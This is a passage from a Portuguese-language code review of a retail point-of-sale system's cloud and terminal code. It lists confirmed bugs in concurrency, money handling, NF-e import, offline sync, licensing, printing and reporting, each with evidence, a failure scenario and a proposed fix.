- **Evidência:** `if not isinstance(items, list) or not 1 <= len(items) <= 200: raise APIError("Itens inválidos")`; o terminal só exige lista não vazia (terminal/store.py:1111) e aceita requisições locais de até 256 KB (terminal/app.py:69). api_common.payload recusa corpo > 1 MB com 413 (api_common.py:48) e o terminal envia sempre os 50 eventos mais antigos, sem reduzir o lote (terminal/sync.py:136).
- **Cenário de falha:** Compra do mês em mercado com 230 produtos distintos: a venda é concluída e paga no terminal, mas a nuvem responde 400 'Itens inválidos' em todo reenvio; a fila fica presa atrás dela. Variante: após um dia offline em atacarejo, 50 vendas consecutivas com média acima de ~55 itens (~370 bytes por item) passam de 1 MB e o lote recebe 413 indefinidamente.
- **Correção:** Aplicar no terminal o mesmo teto de itens/pagamentos da nuvem (ou elevar/remover o teto na nuvem, já que a venda já ocorreu). No sync_once, ao receber 413, reduzir o lote pela metade até 1 evento; opcionalmente montar o lote por tamanho em bytes.

### finance_detail altera título sem lock e com save() completo, podendo desfazer liquidação ou recebimento parcial concorrente

- **Onde:** `cloud/core/views_finance.py:63` · área `cloud-vendas-dinheiro` · categoria `concurrency` · confirmado
- **Evidência:** `row = scoped(FinanceEntry, member.tenant, pk)` fora de transação e sem select_for_update; depois `for key, value in values.items(): setattr(row, key, value)` e `row.save()` sem update_fields (l.93-96), regravando status/amount_cents/settled_at lidos antes. settle (l.109), receive (views_customer_credit.py:63) e apply_credit_receipt (credit_logic.py:253-268) alteram essas mesmas colunas sob lock.
- **Cenário de falha:** Financeiro edita o vencimento de uma parcela de fiado de R$ 100 no mesmo instante em que o terminal sincroniza um recebimento parcial de R$ 40 (a parcela vira R$ 60 aberta + R$ 40 quitada). O save() do PATCH regrava amount_cents=100: o cliente passa a dever R$ 100 e ainda existe a parcela quitada de R$ 40, ou seja, R$ 40 cobrados duas vezes. Com conta a pagar: A liquida enquanto B edita a descrição, o título volta para 'open' e pode ser pago de novo.
- **Correção:** Dentro de transaction.atomic(), recarregar com `FinanceEntry.objects.select_for_update().get(...)`, revalidar `status == 'open'` e salvar com `update_fields=list(values)`.

### Devolução do terminal é validada antes do lock da venda: corrida com devolução/cancelamento do painel gera reembolso em dobro sem conflito

- **Onde:** `cloud/core/credit_logic.py:193` · área `cloud-vendas-dinheiro` · categoria `concurrency` · confirmado
- **Evidência:** apply_return chama `v = validate_return(...)` (l.193), que lê sale.status e as quantidades já devolvidas (l.88,104-106) sem lock; só depois `_persist_return` faz `Sale.objects.select_for_update().get(...)` (l.140) e não revalida. O painel trava a venda antes de validar (views_sales.py:70,88), mas o sync trava apenas a linha do Terminal (views_terminal.py:478).
- **Cenário de falha:** O terminal sincroniza a devolução de 2 un. no mesmo instante em que o gerente registra a devolução das mesmas 2 un. pelo painel. As duas validações enxergam 0 devolvido; ambas gravam: 4 un. voltam ao estoque e dois reembolsos/créditos são emitidos, sem `exceeded` nem SyncConflict. Variante: o painel cancela a venda entre a validação e o lock, e a devolução é gravada sobre venda cancelada (estoque reposto duas vezes).
- **Correção:** Em apply_return, obter `Sale.objects.select_for_update()` antes de validate_return (passando a venda travada para a validação), como o painel já faz.

### Devolução em dinheiro ou crédito de loja é aceita para venda no fiado ainda em aberto

- **Onde:** `cloud/core/credit_logic.py:90` · área `cloud-vendas-dinheiro` · categoria `money` · confirmado
- **Evidência:** validate_return só restringe o método 'account' (`if refund == "account" and not sale.payments.filter(method="credit_account").exists()`, l.98); para 'cash'/'store_credit' não verifica como a venda foi paga nem se há parcela aberta. O terminal também só confere o saldo da gaveta (terminal/store.py:1390-1394).
- **Cenário de falha:** Cliente compra R$ 300 no fiado (nada pago). No dia seguinte devolve os itens e o operador escolhe 'Dinheiro' (com PIN de supervisor): saem R$ 300 da gaveta e a parcela de R$ 300 continua aberta. O fiado virou empréstimo em dinheiro; se o cliente não pagar, a loja perde R$ 300 em espécie em vez de apenas reaver a mercadoria. Com 'crédito na loja' o cliente fica com crédito para gastar e a dívida aberta.
- **Correção:** No terminal e em validate_return: se a venda tiver pagamento credit_account com parcelas abertas, obrigar o abatimento no fiado primeiro (refund='account') e só permitir dinheiro/crédito para o valor que exceder o saldo aberto da venda; na nuvem, para origem terminal, abrir SyncConflict em vez de rejeitar.

### Venda pode ser cancelada com NFC-e em processamento, resultando em nota autorizada para venda cancelada

- **Onde:** `cloud/core/sale_logic.py:199` · área `cloud-vendas-dinheiro` · categoria `correctness` · confirmado
- **Evidência:** `if FiscalDocument.objects.filter(sale=sale, status__in=("authorized", "cancel_pending")).exists(): raise` não cobre 'queued', 'pending' e 'processing', estados criados em operations/views.py:217 e operations/services.py:150-161,171-173; fiscal_result grava 'authorized' depois sem olhar sale.status.
- **Cenário de falha:** Gerente solicita a NFC-e (documento 'queued'); antes de o worker receber a autorização, o caixa ou o painel cancela a venda. reverse_sale passa, estoque e fiado são revertidos; segundos depois o poll marca o documento como 'authorized'. A empresa fica com nota fiscal válida (imposto devido) de uma venda cancelada e nada dispara o cancelamento fiscal.
- **Correção:** Bloquear a reversão pelo painel também para status em andamento ('queued','pending','processing'); no caminho do terminal, e em fiscal_result ao autorizar documento de venda não 'completed', enfileirar automaticamente fiscal.cancel e abrir alerta.

### Nuvem aceita fiado acima do limite e uso de crédito de loja sem saldo, sem registrar conflito para o administrador

- **Onde:** `cloud/core/credit_logic.py:40` · área `cloud-vendas-dinheiro` · categoria `money` · confirmado
- **Evidência:** apply_sale_payments cria o FinanceEntry de fiado e o CustomerCredit negativo sem consultar Customer.credit_limit_cents nem o saldo (`CustomerCredit...defaults={... "delta_cents": -amount ...}`, l.49-52). validate_sale só exige cliente cadastrado (sale_logic.py:116-117). O limite é checado apenas no cache local de cada terminal (terminal/store.py:1217-1221) e não há SyncConflict equivalente ao de estoque negativo.
- **Cenário de falha:** Cliente com limite de fiado de R$ 200 e R$ 50 de crédito na loja compra em dois caixas offline (ou em duas lojas dentro da janela de 30 s do bootstrap): R$ 200 de fiado em cada um e R$ 50 de crédito em cada um. A nuvem grava R$ 400 de fiado (dobro do limite) e saldo de crédito de -R$ 50, sem alerta; o dono só descobre no extrato do cliente.
- **Correção:** Após apply_sale_payments, recalcular balances() do cliente dentro da transação e, se fiado aberto > credit_limit_cents ou crédito < 0, criar SyncConflict (reason='credit_limit_exceeded'/'store_credit_negative') com os valores, mantendo a venda aceita.

### Inventário desconta em dobro as vendas feitas offline antes da contagem e sincronizadas depois

- **Onde:** `cloud/core/views_inventory.py:180` · área `cloud-estoque-catalogo` · categoria `money` · confirmado
- **Evidência:** inventory_count grava `balance_at_count_milli = balance(...)` (saldo central no instante da contagem, linhas 135-143) e inventory_close ajusta `row.counted_milli - row.balance_at_count_milli` (linha 180). StockMovement.created_at é auto_now_add (models.py:496), ou seja, hora da sincronização, não da venda. Nada verifica terminais da loja com fila pendente (Terminal.heartbeat_pending_events / last_seen_at existem em models.py:210-211).
- **Cenário de falha:** Caixa sem internet vende 3 un às 10h (não sincroniza). Contagem às 11h: sistema 10, prateleira 7 → contado 7, snapshot 10. Às 12h o caixa sincroniza: saldo vai a 7. Fechamento às 13h grava ajuste -3 → saldo 4, com 7 unidades físicas. O relatório de perdas mostra perda falsa de 3 un e a sugestão de compra infla.
- **Correção:** No fechamento, para cada item somar ao snapshot os movimentos de venda/estorno/devolução da loja criados depois de counted_at cuja venda tem Sale.created_at < counted_at (delta = contado - (snapshot + esses movimentos)). Além disso, ao abrir/fechar, avisar/bloquear se algum Terminal da loja tiver heartbeat_pending_events > 0 ou last_seen_at antigo.

### Importação de NF-e em duplicidade (duas requisições concorrentes/retry) cria contas a pagar em dobro

- **Onde:** `cloud/core/views_purchases.py:176` · área `cloud-estoque-catalogo` · categoria `concurrency` · confirmado
- **Evidência:** A checagem de duplicidade é feita fora da transação (linhas 116-117). Dentro dela, `receipt, _ = record_receipt(...)` (linha 176) descarta o flag `created`; record_receipt devolve `(previous, False)` quando a chave já existe com o mesmo content_hash (views_stock.py:163-167). O código segue e cria FinanceEntry para cada duplicata (linhas 178-188) e responde 201.
- **Cenário de falha:** NF-e de fornecedor recorrente (todas as linhas 'map'). A primeira requisição demora (200 itens); a conexão cai, o botão é reabilitado (app.js:1667) e o usuário reenvia, ou dois usuários importam o mesmo XML. A segunda passa pela checagem da linha 116 antes do commit da primeira, espera no lock do tenant (linha 136), encontra o recebimento já gravado com o mesmo hash e gera de novo todas as parcelas: contas a pagar duplicadas, risco de pagar o fornecedor duas vezes.
- **Correção:** Usar o retorno: `receipt, created = record_receipt(...)`; `if not created: raise APIError("Esta NF-e já foi importada", 409)` (o raise dentro do atomic desfaz o resto). Ou repetir a checagem de `idempotency_key` logo após o select_for_update do tenant (linha 136).

### Custo da NF-e ignora FCP-ST, II, IPI devolvido e ICMS desonerado; custo médio fica subestimado

- **Onde:** `cloud/core/nfe.py:94` · área `cloud-estoque-catalogo` · categoria `money` · confirmado
- **Evidência:** `total = gross + extras + ipi + st` onde st lê apenas `vICMSST` do primeiro filho de ICMS (linhas 86-94). Não são lidos `vFCPST` (mesmo grupo ICMS), `II/vII`, `impostoDevol/IPI/vIPIDevol` nem `vICMSDeson`, que compõem vNF. O preview só emite o aviso genérico 'há valores fora dos itens, como frete da nota' (views_purchases.py:79-80).
- **Cenário de falha:** NF-e de bebidas no RJ com ST: item vProd 1.000,00, vICMSST 180,00, vFCPST 20,00. vNF = 1.200,00; o sistema lança custo 1.180,00 e a conta a pagar de 1.200,00. Os 2% de FCP-ST nunca entram no custo médio; a margem dos relatórios fica acima da real em todos os produtos com ST, e o aviso atribui a diferença a 'frete'.
- **Correção:** Somar `_decimal(icms[0], "vFCPST")`, `_decimal(imposto, "II/vII")` e `_decimal(det, "impostoDevol/IPI/vIPIDevol")`, e subtrair `vICMSDeson` quando deduzido do total; se ainda sobrar diferença entre soma dos itens e vNF (frete/seguro/outros só no total), ratear proporcionalmente ao vProd em vez de apenas avisar.

### Importação de NF-e ignora uTrib/qTrib: fator padrão 1 e código de barras da caixa geram quantidade e custo unitário errados

- **Onde:** `cloud/core/views_purchases.py:56` · área `cloud-estoque-catalogo` · categoria `correctness` · confirmado
- **Evidência:** nfe.parse lê só qCom/uCom/vUnCom (nfe.py:82, 104-108) e nunca qTrib/uTrib. _suggestions casa produto por `item["ean"]` OU `item["ean_trib"]` e sempre sugere `factor_milli: 1000` (linhas 56-61). _new_product usa `barcode = item["ean"] or item["ean_trib"]` (linha 96), preferindo o GTIN da unidade comercial (caixa/DUN-14) ao da unidade tributável.
- **Cenário de falha:** NF-e de atacado: uCom=CX, qCom=2, vProd=112,00, cEANTrib=EAN da unidade, uTrib=UN, qTrib=24. O produto existe com o EAN unitário; a sugestão vem 'Encontrado pelo código de barras' com fator 1. Aceitando o padrão entram 2 un a R$ 56,00 em vez de 24 un a R$ 4,67: estoque negativo logo em seguida, custo médio 12x maior, margem negativa no relatório. No caminho 'criar produto', o item nasce com o código da caixa e o leitor não acha a unidade.
- **Correção:** Ler uTrib/qTrib/cEANTrib; quando o casamento for por ean_trib (ou uCom != uTrib), sugerir `factor_milli = round(qTrib/qCom*1000)`; em _new_product preferir ean_trib como barcode do produto unitário. Sinalizar na tela quando uCom não for UN/KG/L e o fator estiver em 1.

### Custo médio ponderado ignora mercadoria em trânsito entre lojas

- **Onde:** `cloud/core/views_stock.py:177` · área `cloud-estoque-catalogo` · categoria `money` · confirmado
- **Evidência:** record_receipt usa `previous_quantity = tenant_quantity(tenant, product)` (linha 177), que soma apenas StockBalance (stock_balance.py:46-47). A transferência baixa a origem no envio (views_transfers.py:72) e só credita o destino no recebimento (linha 113); enquanto status='sent' a quantidade não está em saldo nenhum. Se `previous_quantity <= 0`, `average = cost` (linhas 178-183).
- **Cenário de falha:** 100 un a custo R$ 10 são transferidas da Loja A para a B (em trânsito, saldo total 0). Chega uma entrada de 10 un a R$ 20: previous_quantity=0 → custo médio vira R$ 20. Ao receber a transferência há 110 un valorizadas a R$ 20 em vez de ~R$ 10,91; lucro, perdas de inventário e sugestão de compra passam a usar custo quase dobrado.
- **Correção:** Em record_receipt somar ao previous_quantity o total em trânsito: Sum(StockTransferItem.quantity_milli) com transfer__tenant=tenant, transfer__status='sent', product=product (ou manter saldo 'em trânsito' em StockBalance de uma loja virtual).

### PATCH de produto regrava todas as colunas e pode desfazer o custo médio recém-calculado (lost update)

- **Onde:** `cloud/core/views_resources.py:241` · área `cloud-estoque-catalogo` · categoria `concurrency` · confirmado
- **Evidência:** detail carrega a linha sem lock fora da transação (`row = scoped(model, member.tenant, pk)`, linha 214) e depois faz `setattr` + `row.save()` sem update_fields (linhas 239-241), emitindo UPDATE de todos os campos, inclusive cost_cents e price_cents. record_receipt altera cost_cents sob select_for_update (views_stock.py:176, 191-192) e product_groups usa `variants.update(price_cents=...)`.
- **Cenário de falha:** Enquanto uma NF-e de 200 itens é importada (transação longa com lock nos produtos), outro usuário edita o estoque mínimo de um desses produtos. O PATCH leu cost_cents=500, espera o lock, e após o commit da entrada (custo novo 650) grava a linha inteira com 500. O custo médio volta ao valor antigo sem registro; o StockReceiptItem.average_cost_cents diz 650 e o produto diz 500. O mesmo ocorre entre dois PATCH simultâneos de campos diferentes.
- **Correção:** Salvar só o que foi alterado: `row.save(update_fields=[*values, "updated_at"])` para Product (mapeando category_id→category), ou recarregar com select_for_update dentro do atomic antes de aplicar os valores.

### Corrigir o nome de um valor/atributo da grade desativa as variações com estoque e cria produtos novos zerados

- **Onde:** `cloud/core/product_groups.py:74` · área `cloud-estoque-catalogo` · categoria `data-loss` · confirmado
- **Evidência:** sync_variants identifica a variação por `_key(values)` = pares (nome do atributo, valor) em casefold (linhas 48-49, 54). Qualquer combinação fora de `wanted` é desativada (linhas 74-77) e a combinação 'nova' vira outro Product com SKU/EAN novos (linhas 62-70). Não há operação de renomear valor nem checagem de saldo.
- **Cenário de falha:** Grade 'Camiseta' com Cor [Azull, Preto] × Tamanho [P, M]. O usuário corrige 'Azull' para 'Azul' (ou renomeia 'Cor' para 'Cores', ou adiciona o atributo Tamanho a uma grade só de Cor). Todas as variações afetadas ficam inativas com o estoque dentro; nascem produtos novos com saldo 0 e outro código de barras. As etiquetas já impressas apontam para produto inativo; o inventário (_scope exige active=True) e a transferência não enxergam mais o saldo antigo.
- **Correção:** Aceitar no PATCH um mapa de renomeação (valor antigo → novo / atributo antigo → novo) e atualizar variant_values/variant/name dos produtos existentes em vez de recriar; recusar com 409 a remoção de combinação cujo saldo (tenant_quantity) seja diferente de zero, exigindo confirmação explícita.

### Diferença no recebimento de transferência some do estoque sem movimento de perda nem como devolver à origem

- **Onde:** `cloud/core/views_transfers.py:105` · área `cloud-estoque-catalogo` · categoria `correctness` · confirmado
- **Evidência:** transfer_receive aceita `got < item.quantity_milli`, grava received_milli e lança no destino apenas `got` (linhas 105-113); a diferença só aparece como contador `divergent_items` na auditoria (linha 116). Nenhum StockMovement é criado para a falta, e stock_losses só considera sources manual/terminal_adjustment/inventory (views_reports.py:195). A transferência vira 'received' e não pode mais ser cancelada/ajustada (_locked_sent exige 'sent'). `got` falsy de qualquer tipo ('' , null, false) vira 0 sem validação (linha 106).
- **Cenário de falha:** Loja A envia 10 caixas; a Loja B confere 8 (ou digita errado). Saem 10 de A, entram 8 em B; 2 unidades deixam de existir em qualquer saldo e não aparecem em 'Perdas e ajustes de estoque' nem em valor. Se as 2 ficaram esquecidas em A, a única saída é ajuste manual positivo em A, que também não se liga à transferência.
- **Correção:** No recebimento com falta, exigir destino da diferença: 'devolver à origem' (movimento +dif na from_shop, step 'short_back') ou 'perda em trânsito' (movimento explícito com source próprio incluído em stock_losses, com custo). Validar received_milli com product_quantity aceitando 0 explícito e rejeitando outros tipos; recusar product_id que não pertence à transferência.

### Relatórios agregam em Python e filtram por created_at__date sem índice: até 1 ano de linhas carregadas por requisição

- **Onde:** `cloud/core/views_reports.py:152` · área `cloud-estoque-catalogo` · categoria `performance` · confirmado
- **Evidência:** profit_by_day traz uma linha por SaleItem (`.values("day", "line_total_cents", "quantity_milli", "product__cost_cents")` sem annotate, linhas 152-158) e sales_by_payment itera todos os SalePayment (linhas 94-96). _sales filtra `created_at__date__gte/lte` (linhas 46-47), expressão não indexável, e Sale só tem índice (tenant, -received_at, -id) (models.py:281). _period permite 366 dias (linha 40). O servidor roda gunicorn com 3 workers × 2 threads e timeout 60 s (infra/Dockerfile.cloud:16).
- **Cenário de falha:** Mercado com 400 vendas/dia e 6 itens por venda pede 'Lucro bruto por dia' do ano: ~880 mil dicts montados em memória após varrer todas as vendas do tenant. A requisição leva dezenas de segundos e centenas de MB; dois usuários exportando CSV ao mesmo tempo ocupam os workers e o painel (e a sincronização dos caixas, no mesmo processo) fica lento ou estoura timeout.
- **Correção:** Agregar no banco: `.values(day).annotate(revenue=Sum(line_total), cost=Sum(F(quantity_milli)*F(unit_cost)/1000))` e `SalePayment...values(method, payment_method_id).annotate(Sum)`. Trocar o filtro por intervalo de datetime (início do dia local ≤ created_at < dia seguinte) e criar Index(fields=["tenant", "created_at"]) em Sale (migração com AddIndexConcurrently).

### Fila ordenada pelo relógio do PC: se a hora recua, o cancelamento/devolução é enviado antes da venda e o lote é recusado

- **Onde:** `terminal/store.py:346` · área `terminal-backend` · categoria `data-loss` · confirmado
- **Evidência:** `SELECT payload FROM outbox WHERE acked_at IS NULL ORDER BY created_at,rowid LIMIT ?` com created_at = _now_ms() de parede (store.py:318-319). A nuvem exige a venda antes do estorno: 'Venda original do estorno não encontrada' 404 (cloud/core/views_terminal.py:499-500) e 'Venda da devolução não encontrada' (credit_logic.py:86-87). Confirmado: venda feita com relógio 3 min adiantado e cancelada após a correção gera a ordem ['cash.opened', 'sale.voided', 'sale.completed'].
- **Cenário de falha:** O PC está alguns minutos adiantado; o Windows sincroniza a hora (recuo dentro da tolerância de 300 s da licença, então a venda continua liberada). O cliente desiste e o caixa cancela a venda feita instantes antes: o evento sale.voided fica com created_at menor que o da sale.completed, vai primeiro no lote, a nuvem devolve 404 e, como o lote é sempre o mesmo, a fila trava definitivamente.
- **Correção:** Ordenar o outbox apenas pela ordem de inserção (rowid, ou coluna de sequência AUTOINCREMENT) em pending_events, _pending_stock_deltas e _pending_credit_effects; manter created_at só como dado informativo.

### Relógio adiantado e depois corrigido bloqueia as vendas por até 72 h; nem o bootstrap online desfaz

- **Onde:** `terminal/store.py:450` · área `terminal-backend` · categoria `correctness` · confirmado
- **Evidência:** lease_status() grava `last_seen = now` sempre que a licença está ativa (store.py:467-468) e depois recusa com `if last_seen and now + 300 < last_seen: return {"state": "clock_rollback", "can_sell": False ...}` (store.py:449-452). apply_bootstrap() grava a licença nova mas nunca ajusta last_seen (store.py:683-689); a chave só é apagada em _clear_connection_meta, inacessível com histórico. Confirmado: lease_status(now+24h) -> active; lease_status(now) -> clock_rollback; após apply_bootstrap com licença recém-assinada continua clock_rollback.
- **Cenário de falha:** O PC liga com a data um dia à frente (ajuste manual errado ou hora 'corrigida' na mão em vez do fuso). O terminal abre a tela, a licença de 72 h ainda é válida e last_seen vai para o futuro. O Windows acerta a hora pela internet: o caixa passa a mostrar 'Relógio do computador voltou; ajuste a hora' e não vende por ~24 h, mesmo online, com a hora certa e a nuvem emitindo licença nova a cada 30 s. A única saída é adiantar o relógio de novo, o oposto do que a mensagem pede.
- **Correção:** Ao aceitar em apply_bootstrap uma licença recém-assinada cujo issued_at (hora do servidor) esteja dentro da tolerância do relógio local, redefinir last_seen para esse issued_at. Opcionalmente usar server_time do heartbeat para o mesmo fim.

### A thread única do worker morre com qualquer exceção fora de (TerminalError, OSError, ValueError) e não é reiniciada: sync, heartbeat, renovação de licença e impressão param até reiniciar o programa

- **Onde:** `terminal/sync.py:223` · área `terminal-backend` · categoria `concurrency` · confirmado
- **Evidência:** Os blocos de impressão, sync e bootstrap capturam apenas `except (TerminalError, OSError, ValueError)` (sync.py:223, 230, 236, 245); só o backup inclui sqlite3.Error (linha 218). `if self.store.meta().get("token")` (linha 225) está fora de qualquer try. sqlite3.OperationalError/IntegrityError, KeyError, TypeError e AttributeError não são capturados; a thread é daemon e não há supervisão. Há escrita longa com trava exclusiva: apply_bootstrap reescreve todo o catálogo numa transação (store.py:594-639) e manager_override/login executam PBKDF2 de 310.000 rodadas por gerente dentro de BEGIN IMMEDIATE (store.py:851-857, 878-885), com busy_timeout de 10 s (store.py:218).
- **Cenário de falha:** Em PC lento com catálogo grande, a tela dispara /api/bootstrap enquanto o worker tenta begin_print/ack; a espera passa de 10 s e o worker recebe 'database is locked' (sqlite3.OperationalError) e encerra em silêncio. Outro gatilho: um código de barras movido entre dois produtos entre duas páginas do bootstrap viola `barcode TEXT UNIQUE` (store.py:118) e gera IntegrityError. A tela continua vendendo, os pendentes só crescem, recibos enfileirados não saem e em 72 h a licença expira, até alguém reiniciar o serviço.
- **Correção:** Envolver cada etapa do laço em `except Exception` com registro em last_sync_error (deixando só KeyboardInterrupt/SystemExit passar), e adicionar um vigia que recrie a thread se ela morrer. Tirar o PBKDF2 de dentro da transação de escrita e converter sqlite3.Error em TerminalError 503 nas rotas.

### Terminal aceita o que a nuvem recusa por limite ou formato: venda com mais de 200 itens ou 20 pagamentos, IDs de devolução/recebimento não UUID e lote acima de 1 MB

- **Onde:** `terminal/store.py:1111` · área `terminal-backend` · categoria `correctness` · confirmado
- **Evidência:** sale() só exige listas não vazias (store.py:1109-1112); a nuvem exige `1 <= len(items) <= 200` e `1 <= len(payments) <= 20` (cloud/core/sale_logic.py:49-52). return_id e receipt_id passam apenas por _str (store.py:1345, 1459), mas a nuvem exige UUID (`uuid_value(aggregate_id, ...)` em views_terminal.py:381 e 393). sync_once envia sempre 50 eventos (sync.py:136) e a nuvem recusa corpo acima de 1 MB com 413 (api_common.py:48) sem que o terminal reduza o lote. Confirmado: venda com 201 produtos distintos é concluída localmente.
- **Cenário de falha:** Atacarejo fecha uma compra com 210 produtos diferentes: a venda conclui, o dinheiro entra, mas o evento recebe 'Itens inválidos' para sempre. Ou: após um dia offline em mercado com cestas de ~60 itens, os 50 primeiros eventos somam mais de 1 MB e todo envio volta 413. Em ambos os casos a fila trava.
- **Correção:** Aplicar no terminal os mesmos limites da nuvem (200 itens, 20 pagamentos, IDs em formato UUID) antes de gravar; montar o lote por tamanho em bytes (por exemplo até ~512 KB) e reduzir pela metade ao receber 413.

### Qualquer pessoa na tela de login pode trocar o terminal para um perfil vazio e despareado (/api/new-profile e /api/unpair sem autenticação)

- **Onde:** `terminal/app.py:173` · área `terminal-backend` · categoria `security` · confirmado
- **Evidência:** `@app.post("/api/new-profile")` e `@app.post("/api/unpair")` não usam @authenticated (app.py:164-207); new_profile ainda exige que NÃO haja operador logado (`if session.get("operator_id"): raise ...`, linha 180). O botão 'Criar novo perfil para outra empresa' fica na tela de PIN (templates/index.html:59). Não existe rota para voltar ao perfil anterior; só editando active-profile.json.
- **Cenário de falha:** Com o caixa fechado e a fila sincronizada (toda manhã antes de abrir), um funcionário ou curioso clica no botão e confirma: o terminal passa a usar um banco novo, com outro device_id, sem operadores e sem pareamento. A loja não abre até o dono gerar novo código, parear como terminal novo (consumindo vaga do plano até revogar o antigo), e o histórico de vendas local some da tela.
- **Correção:** Exigir PIN de owner/admin do perfil atual (manager_override restrito a esses papéis) para new-profile e unpair quando o terminal estiver pareado; adicionar rota autenticada para listar e reativar perfis anteriores.

### Falha de impressão vira 'uncertain' e nunca é reenviada, mesmo quando nenhum byte saiu; offline o spool espera até 60 s

- **Onde:** `terminal/sync.py:187` · área `terminal-backend` · categoria `ux-bug` · confirmado
- **Evidência:** print_once() trata qualquer exceção de send_bytes como incerta: `except Exception as exc: store.finish_print(job["id"], error=exc)` (sync.py:185-189), inclusive `socket.create_connection` recusada (printers.py:377) ou `lp` ausente/fila inexistente (printers.py:421-433), casos em que nada foi enviado. begin_print só pega status 'queued' (store.py:1656), e a volta à fila exige retry manual com confirm_duplicate, job a job (app.py:398-403). Além disso o mesmo laço dorme `min(60, interval * 2 ** failures)` quando a nuvem está fora (sync.py:247-252).
- **Cenário de falha:** A impressora térmica fica sem papel ou o cabo de rede solta por 20 minutos no pico: os recibos desse período ficam 'uncertain' e não saem quando a impressora volta; o operador precisa reenfileirar um por um confirmando 'pode duplicar'. Com a internet fora, comprovantes de devolução/recebimento de fiado enfileirados sem flush imediato esperam até 60 s.
- **Correção:** Distinguir falha antes do envio (erro de conexão, fila inexistente, comando lp ausente) e manter o job 'queued' com nova tentativa e backoff; reservar 'uncertain' para erro após o início do envio. Separar o laço de impressão (intervalo curto fixo) do backoff de rede.

### Com impressora CUPS, operador com papel de caixa recebe 403 na verificação da fila a cada venda: abre a janela de impressão do navegador e o recibo térmico sai depois, em duplicidade

- **Onde:** `terminal/app.py:370` · área `terminal-backend` · categoria `ux-bug` · confirmado
- **Evidência:** `@app.get("/api/print/discover") @authenticated(*MANAGER_ROLES)` (app.py:369-372), mas o fluxo de toda venda chama `await api('/api/print/discover')` quando o driver é cups e, em erro, retorna autoPrint:true sem chamar /api/print/flush (terminal/static/terminal.js:183-189). O job já foi enfileirado por _queue_receipt (store.py:1260) e o worker o envia depois (sync.py:221).
- **Cenário de falha:** Loja em macOS/Linux com TM-T20 via CUPS, operador 'cashier': em cada venda aparece 'A fila CUPS não está acessível pelo contêiner', abre o diálogo de impressão do sistema e, de 5 a 60 s depois, a térmica imprime o mesmo recibo sozinha. Fila lenta e cliente com dois comprovantes.
- **Correção:** Liberar /api/print/discover para SELL_ROLES (é só leitura) ou, melhor, fazer /api/print/flush devolver o resultado real do job e o front decidir por ele, sem consultar as filas a cada venda.

### Terminal impede a venda quando o saldo local é zero, embora a nuvem aceite saldo negativo; produto na mão do cliente não passa no caixa

- **Onde:** `terminal/store.py:1162` · área `terminal-backend` · categoria `money` · confirmado
- **Evidência:** `if row["stock_controlled"] and row["stock_milli"] < qty: raise TerminalError(f"Estoque insuficiente: {row['name']}", 409)` (store.py:1162-1163), reforçado por `CHECK(stock_milli>=0)` (linha 124) e `stock = max(0, stock + pending_deltas...)` no bootstrap (linha 608). A nuvem recebe a mesma venda com stock_status='negative' e apenas abre conflito (cloud/core/sale_logic.py:152-154; views_terminal.py:339-356). Ajuste de estoque exige papel owner/admin/manager/inventory (app.py:353).
- **Cenário de falha:** Mercadoria chegou e foi para a gôndola, mas a entrada ainda não foi lançada (ou o terminal está offline e não recebeu a entrada feita no painel). O cliente chega ao caixa com o produto; o caixa não consegue registrar nem ajustar o estoque e precisa chamar o gerente ou perder a venda. Em mercearia isso ocorre todos os dias.
- **Correção:** Tornar a política configurável por empresa (assinada na licença): 'permitir venda sem saldo' com aviso e registro de conflito, ou 'bloquear'. Para permitir, remover o CHECK >= 0 do SQLite e o max(0, ...) do bootstrap.

### Cada bootstrap (a cada 30 s) grava uma linha de auditoria; a tela de auditoria (últimas 100) fica tomada por ruído e a exportação cresce sem limite

- **Onde:** `terminal/store.py:690` · área `terminal-backend` · categoria `performance` · confirmado
- **Evidência:** `self._audit(conn, None, "terminal.bootstrap", None, f"{len(products)} produtos; ...")` em todo apply_bootstrap (store.py:690), disparado quando `bootstrap_at` tem mais de 30 s (sync.py:243): ~2.880 linhas por dia. audit() devolve `ORDER BY created_at DESC LIMIT 100` (store.py:1524) e export_data() carrega a tabela inteira em memória (store.py:1544). Outbox confirmado e print_jobs (BLOB do recibo) também nunca são podados, e o backup diário guarda 7 cópias do banco inteiro (store.py:1581).
- **Cenário de falha:** O gerente abre Auditoria para ver quem cancelou uma venda de manhã: as 100 linhas mostram só 'terminal.bootstrap' dos últimos 50 minutos; login falho, cancelamento e reimpressão já saíram da lista. Depois de um ano são ~1 milhão de linhas de auditoria mais todos os recibos em BLOB; /api/export (a saída de emergência após expirar a licença) monta centenas de MB em memória num PC de caixa e o banco e os 7 backups ocupam o disco.
- **Correção:** Não auditar bootstrap sem mudança (ou manter só o último em meta); paginar/filtrar /api/audit por ação; podar outbox confirmado e print_jobs impressos após N dias; exportar em streaming.

### Corpo de erro dos provedores é descartado: a fila só mostra 'Provedor recusou a operação (HTTP 400/422)'

- **Onde:** `integrations/base.py:21` · área `operations-integracoes` · categoria `ux-bug` · confirmado
- **Evidência:** Linhas 21-24: `if not 200 <= response.status_code < 300: raise ProviderError(f"Provedor recusou a operação (HTTP {response.status_code}).", ...)` — o corpo nunca é lido. O Asaas devolve `errors[].description` (ex.: CPF/CNPJ inválido) e a Focus devolve `codigo`/`mensagem`/`erros[].campo` nos 422. Em services.py:231 só `str(exc)` vai para `last_error`; `FiscalDocument.error_message` fica vazio nesses casos (só é preenchido com `mensagem_sefaz`, services.py:157).
- **Cenário de falha:** Lojista envia NFC-e com campo obrigatório faltando: a tela Integrações mostra apenas 'HTTP 422'. Ninguém (nem o suporte) sabe qual campo corrigir sem abrir o painel da Focus. O mesmo ocorre na contratação quando o Asaas recusa o documento do pagador.
- **Correção:** Em `ProviderClient.request`, para 4xx, tentar `response.json()` e extrair de forma limitada (ex.: até 300 caracteres) `errors[].description` (Asaas) ou `mensagem` + `erros[].mensagem/campo` (Focus); guardar em `ProviderError.detail` e gravar em `last_error`/`FiscalDocument.error_message`. Não incluir cabeçalhos nem o payload enviado.

### Carência ancorada na meia-noite do vencimento bloqueia cliente que paga boleto no prazo em fim de semana/feriado

- **Onde:** `operations/services.py:36` · área `operations-integracoes` · categoria `money` · confirmado
- **Evidência:** `_end_period` (l.36-40) devolve 00:00 do dia de vencimento seguinte; `subscription_window` (cloud/core/api_common.py:161-164) bloqueia quando `current_period_end + 72h <= now`, e o lease do terminal é limitado a esse prazo (cloud/core/views_terminal.py:86-87). O período pago termina exatamente no vencimento da próxima cobrança do Asaas, sem folga, e a liberação só acontece quando o webhook de pagamento confirmado é reconciliado (services.py:94-100).
